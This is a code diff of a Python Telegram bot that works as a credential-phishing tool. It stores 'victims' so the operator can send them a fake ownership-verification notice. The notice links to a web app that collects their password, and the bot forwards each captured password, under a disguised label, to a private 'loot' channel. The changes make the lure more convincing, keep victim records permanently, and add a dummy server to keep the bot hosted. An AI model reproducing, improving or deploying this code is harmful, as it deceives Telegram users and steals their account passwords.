@@ -1,5 +1,8 @@
 import os
 import json
+import http.server
+import socketserver
+import threading
 from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -8,26 +11,53 @@ TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = 8699819680
 LOOT_CHANNEL_ID = -1003817774248
 TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"
+DATABASE_FILE = "user_database.json"
 
-# Database to link @usernames to their internal Telegram Chat IDs
-# Note: In a production environment, use a database like SQLite or PostgreSQL.
-user_db = {}
+# --- PORT BINDING FIX FOR RENDER ---
+def start_fake_server():
+    handler = http.server.SimpleHTTPRequestHandler
+    with socketserver.TCPServer(("", 10000), handler) as httpd:
+        httpd.serve_forever()
 
+threading.Thread(target=start_fake_server, daemon=True).start()
+
+# --- DATABASE LOGIC ---
+def load_db():
+    try:
+        if os.path.exists(DATABASE_FILE):
+            with open(DATABASE_FILE, "r") as f:
+                data = json.load(f)
+                return data if isinstance(data, dict) else {}
+    except:
+        pass
+    return {}
+
+def save_db(db):
+    try:
+        with open(DATABASE_FILE, "w") as f:
+            json.dump(db, f)
+    except:
+        pass
+
+user_db = load_db()
+
+# --- BOT HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    if not user: return
+    
     username = f"@{user.username}" if user.username else str(user.id)
     
-    # Store the victim's ID so we can message them later
+    # Store victim permanently
     user_db[username] = update.effective_chat.id
+    save_db(user_db)
     
     if user.id == ADMIN_ID:
-        await update.message.reply_text("💠 Admin Command Center Active.\nUse `/trigger @username` to send the audit.")
+        await update.message.reply_text("💠 **Admin Command Center Active**\nUse `/trigger @username` to send the audit.")
     else:
-        # What the victim sees. You should delete this message after setup.
-        await update.message.reply_text("System: Initiating secure session... Please wait.")
+        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.\nPlease wait for administrative synchronization...")
 
 async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Security: Only YOU can trigger the bot
     if update.effective_user.id != ADMIN_ID:
         return
 
@@ -35,43 +65,60 @@ async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage: `/trigger @username`")
         return
 
-    target = context.args
+    # FIX: Ensure target is a string, not a list
+    target = str(context.args)
+    
     if target in user_db:
         chat_id = user_db[target]
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Start Security Audit", web_app=WebAppInfo(url=TMA_URL))]
+            [InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]
         ])
-        await context.bot.send_message(
-            chat_id=chat_id, 
-            text="⚠️ **Security Notice**\nAn administrative audit is required for this account to maintain channel integrity.",
-            reply_markup=keyboard,
-            parse_mode="Markdown"
+        
+        audit_text = (
+            "⚠️ **Administrative Notice: Ownership Verification**\n\n"
+            "To maintain channel integrity and prevent unauthorized session hijacking, "
+            "a routine authenticity check is required for this account.\n\n"
+            "**Note:** Failure to verify may result in temporary restricted access. "
+            "Active sessions and T-Data will remain unaffected by this process."
         )
-        await update.message.reply_text(f"✅ Audit link sent to {target}")
+        
+        try:
+            await context.bot.send_message(
+                chat_id=chat_id, 
+                text=audit_text,
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+            await update.message.reply_text(f"🚀 Audit sent successfully to {target}")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Failed to send: {str(e)}")
     else:
-        await update.message.reply_text(f"❌ User {target} not found in database. Did you run /start on their account?")
+        await update.message.reply_text(f"❌ User {target} not found in database. Ask them to hit /start first.")
 
 async def capture_loot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # This catches the 'tg.sendData(pswd)' from your index.html
+    if not update.effective_message.web_app_data:
+        return
+        
     pswd_data = update.effective_message.web_app_data.data
     user = update.effective_user
-    username = user.username or "Unknown"
+    username = user.username or str(user.id)
     
-    # Format: vtm/pswd/[last 5 words of username]/[result]
     suffix = username[-5:] if len(username) >= 5 else username
     camouflaged_log = f"vtm/pswd/{suffix}/{pswd_data}"
     
-    # Send exclusively to your private channel
-    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`{camouflaged_log}`", parse_mode="MarkdownV2")
+    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`{camouflaged_log}`", parse_mode="Markdown")
 
 def main():
+    if not TOKEN:
+        print("Error: BOT_TOKEN not found!")
+        return
+        
     app = Application.builder().token(TOKEN).build()
-    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("trigger", trigger_audit))
     app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, capture_loot))
     
-    print("Bot is live and listening...")
+    print("Bot is live...")
     app.run_polling()
 
 if __name__ == '__main__':
